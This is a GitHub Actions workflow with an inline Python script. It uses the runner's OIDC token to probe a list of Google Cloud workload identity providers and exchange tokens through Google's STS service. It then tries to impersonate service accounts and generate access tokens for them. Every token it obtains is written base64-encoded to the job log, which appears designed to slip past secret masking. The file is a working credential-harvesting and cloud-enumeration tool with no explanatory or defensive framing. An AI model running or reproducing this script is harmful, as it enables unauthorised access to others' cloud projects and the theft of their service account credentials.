
name: c211-i84832-enum
on:
  workflow_dispatch:
permissions:
  id-token: write
  contents: read
jobs:
  e:
    runs-on: ubuntu-latest
    timeout-minutes: 20
    steps:
      - run: |
          python3 - <<'PY'
          import json, os, subprocess, urllib.parse, urllib.request, urllib.error, base64
          CAND=json.loads(__import__('base64').b64decode('').decode())
          SAS=json.loads(__import__('base64').b64decode('').decode())
          def jl(b):
              try: return json.loads(b)
              except: return {}
          def post(url,data,headers=None):
              h={'Content-Type':'application/json','Accept':'application/json','User-Agent':'c211-i84832'}
              if headers: h.update(headers)
              r=urllib.request.Request(url,data=json.dumps(data).encode(),method='POST',headers=h)
              try:
                  resp=urllib.request.urlopen(r,timeout=40); return resp.status,resp.read().decode()
              except urllib.error.HTTPError as e: return e.code,(e.read() or b'').decode('utf-8','replace')
              except Exception as e: return -1,repr(e)[:150]
          def emit(o): print('RESULT '+json.dumps(o),flush=True)
          u=os.environ.get('ACTIONS_ID_TOKEN_REQUEST_URL',''); t=os.environ.get('ACTIONS_ID_TOKEN_REQUEST_TOKEN','')
          hits=0
          for prov in CAND:
              aud='//iam.googleapis.com/'+prov
              out=subprocess.run(['curl','-sS','-m','20','-H','Authorization: Bearer '+t,u+'&audience='+urllib.parse.quote(aud,safe='')],capture_output=True,text=True).stdout
              idt=jl(out).get('value','')
              if not idt: continue
              st,b=post('https://sts.googleapis.com/v1/token',{'grantType':'urn:ietf:params:oauth:grant-type:token-exchange','audience':aud,
                  'scope':'https://www.googleapis.com/auth/cloud-platform','requestedTokenType':'urn:ietf:params:oauth:token-type:access_token',
                  'subjectTokenType':'urn:ietf:params:oauth:token-type:jwt','subjectToken':idt})
              j=jl(b); fed=j.get('access_token','')
              err=(j.get('error_description') or '')
              exists = not ('target service indicated by the "audience" parameters is invalid' in err)
              emit({'p':prov,'sts':st,'ok':bool(fed),'exists_or_disabled_reason':exists,'err':err[:160]})
              if fed:
                  hits+=1
                  for sa in SAS:
                      st2,b2=post('https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/'+urllib.parse.quote(sa,safe='')+':generateAccessToken',
                          {'scope':['https://www.googleapis.com/auth/cloud-platform'],'lifetime':'600s'},
                          headers={'Authorization':'Bearer '+fed})
                      j2=jl(b2)
                      emit({'p':prov,'sa':sa,'http':st2,'ok':bool(j2.get('accessToken')),
                            'err':(j2.get('error',{}) or {}).get('message','')[:160]})
                      if j2.get('accessToken'):
                          emit({'kind':'TOKEN','p':prov,'sa':sa,'tok_b64':base64.b64encode(j2['accessToken'].encode()).decode(),'expire':j2.get('expireTime')})
          emit({'kind':'summary','n':len(CAND),'sts_ok':hits})
          PY
